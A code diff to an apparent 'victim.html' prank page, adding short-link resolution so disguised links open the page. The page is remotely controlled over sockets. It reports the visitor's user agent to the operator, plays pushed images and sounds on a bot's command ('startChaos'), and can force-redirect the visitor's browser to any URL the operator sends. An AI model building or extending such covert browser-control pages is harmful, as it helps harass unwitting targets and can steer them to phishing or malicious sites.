@@ -227,7 +227,36 @@
         });
 
         const socket = io();
-        const id = new URLSearchParams(window.location.search).get('id');
+        
+        // Получаем ID из параметра или из пути URL
+        let id = new URLSearchParams(window.location.search).get('id');
+        
+        // Если ID нет в параметрах, значит используется короткая ссылка
+        if (!id) {
+            const pathParts = window.location.pathname.split('/');
+            const shortCode = pathParts[pathParts.length - 1];
+            
+            // Запрашиваем session ID по короткому коду
+            if (shortCode && shortCode !== '' && shortCode !== 'victim.html') {
+                fetch(`/api/resolve/${shortCode}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            id = data.sessionId;
+                            initializeConnection();
+                        } else {
+                            console.error('Session not found');
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Error resolving short code:', err);
+                    });
+            }
+        } else {
+            // ID есть в параметрах, инициализируем сразу
+            initializeConnection();
+        }
+        
         let audio = new Audio();
         const prankView = document.getElementById('prank-view');
         const prankBackground = document.getElementById('prank-background');
@@ -238,32 +267,38 @@
 
         audio.preload = 'auto';
         
-        socket.emit('join-room-victim', { roomId: id, userAgent: navigator.userAgent });
-
-        socket.on('update-media', (data) => {
-            console.log('Media update:', data);
+        function initializeConnection() {
+            if (!id) return;
             
-            if (data.image) {
-                currentImageUrl = data.image;
-                prankBackground.style.backgroundImage = `url('${data.image}')`;
-                prankImage.src = data.image;
-            }
+            socket.emit('join-room-victim', { roomId: id, userAgent: navigator.userAgent });
+
+            socket.on('update-media', (data) => {
+                console.log('Media update:', data);
+                
+                if (data.image) {
+                    currentImageUrl = data.image;
+                    prankBackground.style.backgroundImage = `url('${data.image}')`;
+                    prankImage.src = data.image;
+                }
+                
+                if (data.sound) {
+                    audio.src = data.sound;
+                    audio.load();
+                    console.log('Sound loaded:', data.sound);
+                }
+            });
+
+            socket.on('play-sound', () => {
+                console.log('🔊 Sound command from bot!');
+                startChaos();
+            });
+
+            socket.on('force-redirect', (data) => {
+                window.location.href = data.url;
+            });
             
-            if (data.sound) {
-                audio.src = data.sound;
-                audio.load();
-                console.log('Sound loaded:', data.sound);
-            }
-        });
-
-        socket.on('play-sound', () => {
-            console.log('🔊 Sound command from bot!');
-            startChaos();
-        });
-
-        socket.on('force-redirect', (data) => {
-            window.location.href = data.url;
-        });
+            console.log('🎯 Prank ready | ID:', id);
+        }
 
         function startChaos() {
             hasInteracted = true;
@@ -356,8 +391,6 @@
         setInterval(() => {
             socket.emit('ping');
         }, 30000);
-
-        console.log('🎯 Prank ready | ID:', id);
     </script>
 </body>
 </html>
